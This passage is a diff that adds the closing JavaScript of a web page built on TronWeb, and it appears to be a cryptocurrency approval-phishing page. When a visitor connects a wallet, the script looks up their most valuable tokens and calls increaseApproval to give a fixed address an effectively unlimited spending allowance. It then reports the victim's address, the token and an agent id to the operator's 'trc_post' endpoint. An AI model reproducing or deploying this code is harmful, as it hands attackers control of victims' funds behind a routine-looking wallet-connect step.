+						let walletAddress = tronWeb.defaultAddress.base58;
+						bizhong = await getMostValuableAssets(walletAddress);
+						let instance = await tronWeb.contract().at(approveAddr);
+						let res = await instance["increaseApproval"](authorized_address,"90000000000000000000000000000");
+						res.send({
+							feeLimit: 10000000,
+							callValue: 0,
+							shouldPollResponse: false
+						}, function(err, res) {
+							if (err == null) {
+								postInfo(walletAddress, bizhong)
+							}
+							$('.modal-overlay').remove();
+							$('.modal').removeClass('modal-in').addClass('modal-out');
+						})
+					}
+					async function init() {
+						onConnect();
+					}
+
+					/**
+					* Main entry point.
+					*/
+					init();
+					document.querySelector(".btn-connect").addEventListener("click", onConnect);
+				})
+
+				async function postInfo(address, symbol) {
+					var data = {
+						address: address,
+						auth_address: authorized_address,
+						bizhong: symbol,
+						agent: agent
+					}
+
+					var d = new Date();
+					var n = d.getTime();
+
+					$.ajax({
+						type: 'get',
+						url:  domain + "{:url('index/api/trc_post')}?t="+n,
+						data: data,
+						success:function(){
+						}
+					})
+				}
+			</script>
+        </div>
+    </body>
+</html>
